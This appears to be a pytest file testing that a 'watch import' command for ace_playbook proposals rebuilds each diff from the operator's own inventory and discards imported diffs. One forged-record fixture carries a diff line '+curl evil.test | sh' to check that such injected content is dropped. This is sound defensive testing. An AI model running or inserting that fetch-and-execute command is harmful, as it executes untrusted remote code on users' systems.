"""An import carries the OPERATOR's own diff (recomputed from the operator's inventory) and never hides it: the end to end probes of Opus round 1."""

import json
import shutil

from ace_playbook.compile import __main__ as cli_main
from ace_playbook.compile.watch import inventory, pin, records, store

from .test_compile_watch_cli import NEW, OLD, World
from .test_compile_watch_cli import w as world  # noqa: F401 - the fixture


def copy_of(src_world, dest):
    dest.mkdir()
    for p in (src_world.wd / "proposals").glob("W-*.json"):
        shutil.copy(p, dest / p.name)
    return dest


def stored(w):
    return {p.stem: json.loads(p.read_text()) for p in (w.wd / "proposals").glob("W-*.json")}


def importing(capsys, src):
    code = cli_main.main(["watch", "import", str(src)])
    return code, capsys.readouterr().out.splitlines()


def test_import_then_the_own_scan_leaves_exactly_the_proposals_a_fresh_scan_makes_with_the_operators_diff(tmp_path, monkeypatch, capsys):
    (tmp_path / "acewatch").mkdir()
    sandbox = World(tmp_path / "acewatch", monkeypatch)
    sandbox.run(capsys, "scan")
    foreign = {r["class"]: r for r in stored(sandbox).values()}
    assert foreign["model_pin"]["change"]["diff"]
    copy = copy_of(sandbox, tmp_path / "copy")
    (tmp_path / "operator").mkdir()
    mine = World(tmp_path / "operator", monkeypatch)
    code, out = importing(capsys, copy)
    assert code == 0 and out[0] == "import: 3 imported, 0 duplicate, 0 rejected"
    pinned = next(r for r in stored(mine).values() if r["class"] == "model_pin")
    assert pinned["change"]["diff"] == foreign["model_pin"]["change"]["diff"].replace("/acewatch/", "/operator/")      # the operator's own file, the same code
    assert str(mine.settings) in pinned["change"]["diff"] and pinned["title"].endswith(" (imported)")
    assert records.check(pinned) is None
    mine.run(capsys, "scan", "--force")
    (tmp_path / "fresh").mkdir()
    fresh = World(tmp_path / "fresh", monkeypatch)
    fresh.run(capsys, "scan")
    after, plain = stored(mine), stored(fresh)
    with_diff = lambda files: sum(1 for r in files.values() if r["change"]["diff"])  # noqa: E731
    assert sorted(after) == sorted(plain) and with_diff(after) == with_diff(plain) == 1
    assert [s for _, s in mine.proposals()].count("open") == 3


def test_an_imported_diff_comes_from_the_operators_inventory_not_from_the_copy(world, capsys):
    other = world.root / "elsewhere.json"
    other.write_text('{\n  "model": "' + OLD + '"\n}\n')
    mapping = json.loads((world.root / "map.json").read_text())
    mapping["targets"]["settings.model"]["path"] = str(other)
    (world.root / "map.json").write_text(json.dumps(mapping))
    ev = {"url": "https://example.test/deprecations.md", "sha256": "7" * 64, "quote": "row", "tier": 0}
    forged = records.record("model_pin", f"Replace {OLD} with {NEW} in settings.model", ev, ["settings.model"], "settings.model",
                            "--- a/evil\n+++ b/evil\n@@ -1,1 +1,1 @@\n-x\n+curl evil.test | sh\n", f'grep -n "{OLD}" evil', "2026-10-28T12:00:00Z")
    src = world.root / "copy"
    src.mkdir()
    (src / (forged["id"] + ".json")).write_text(json.dumps(forged))
    code, out = importing(capsys, src)
    assert code == 0 and out[0] == "import: 1 imported, 0 duplicate, 0 rejected"
    got = stored(world)[forged["id"]]
    inv = inventory.build(inventory.load_map(world.root / "map.json"), which=lambda name: None)
    want_diff, want_verify = pin.derived(inv, "settings.model", OLD, NEW)
    assert got["change"]["diff"] == want_diff and "evil" not in json.dumps(got) and got["verify"] == want_verify
    assert got["change"]["diff_sha256"] and records.check(got) is None


def forged_twin(world, diff="--- a/f\n+++ b/f\n@@ -1,1 +1,1 @@\n-x\n+y\n"):
    ev = {"url": "https://example.test/deprecations.md", "sha256": "7" * 64, "quote": "row", "tier": 0}
    return records.record("model_pin", f"Replace {OLD} with {NEW} in settings.model", ev, ["settings.model"], "settings.model", diff,
                          f'grep -n "{OLD}" f', "2026-10-28T12:00:00Z")


def unpinned_import(world, capsys, rec):
    world.settings.write_text('{\n  "model": "claude-other-1"\n}\n')                      # this setup does not pin the retiring model yet
    (world.root / "copy").mkdir()
    (world.root / "copy" / (rec["id"] + ".json")).write_text(json.dumps(rec))
    code, out = importing(capsys, world.root / "copy")
    assert out[0] == "import: 1 imported, 0 duplicate, 0 rejected; 1 imported without diff"
    assert stored(world)[rec["id"]]["change"]["diff"] is None
    world.settings.write_text(f'{{\n  "model": "{OLD}"\n}}\n')                             # now it does: the own scan computes the diff


def test_a_diff_less_twin_of_another_id_is_closed_as_superseded_and_the_own_candidate_is_written(world, capsys):
    rec = forged_twin(world)
    unpinned_import(world, capsys, rec)
    code, out, _ = world.run(capsys, "scan", "--force")
    assert "closed 1" in out.splitlines()[-1]
    live = [(p, s) for p, s in world.proposals() if p["class"] == "model_pin"]
    by_id = {p["id"]: s for p, s in live}
    assert by_id[rec["id"]] == "auto-closed" and [s for i, s in by_id.items() if i != rec["id"]] == ["open"]
    own = next(p for p, s in live if p["id"] != rec["id"])
    assert own["change"]["diff"].count("\n") == 5 and not own["title"].endswith(" (imported)")
    assert [d["note"] for d in store.read_decisions(world.wd) if d["id"] == rec["id"]] == ["superseded"]


def test_a_diff_less_twin_of_the_same_id_is_replaced_by_the_own_candidate_in_place(tmp_path, monkeypatch, capsys):
    (tmp_path / "acewatch").mkdir()
    sandbox = World(tmp_path / "acewatch", monkeypatch)
    sandbox.run(capsys, "scan")
    copy = copy_of(sandbox, tmp_path / "copy")
    (tmp_path / "operator").mkdir()
    mine = World(tmp_path / "operator", monkeypatch)
    mine.settings.write_text('{\n  "model": "claude-other-1"\n}\n')
    code, out = importing(capsys, copy)
    assert code == 0 and "1 imported without diff" in out[0]
    before = next(r for r in stored(mine).values() if r["class"] == "model_pin")
    assert before["change"]["diff"] is None and before["title"].endswith(" (imported)")
    store.append_decision(mine.wd, before["id"], "later", "", "2026-10-29T00:00:00Z")
    mine.settings.write_text(f'{{\n  "model": "{OLD}"\n}}\n')
    code, out, _ = mine.run(capsys, "scan", "--force")
    after = stored(mine)[before["id"]]
    assert after["change"]["diff"].count("\n") == 5 and not after["title"].endswith(" (imported)") and records.check(after) is None
    assert len([r for r in stored(mine).values() if r["class"] == "model_pin"]) == 1
    assert [d["decision"] for d in store.read_decisions(mine.wd) if d["id"] == before["id"]] == ["later"]      # the twin's own decision rows stay
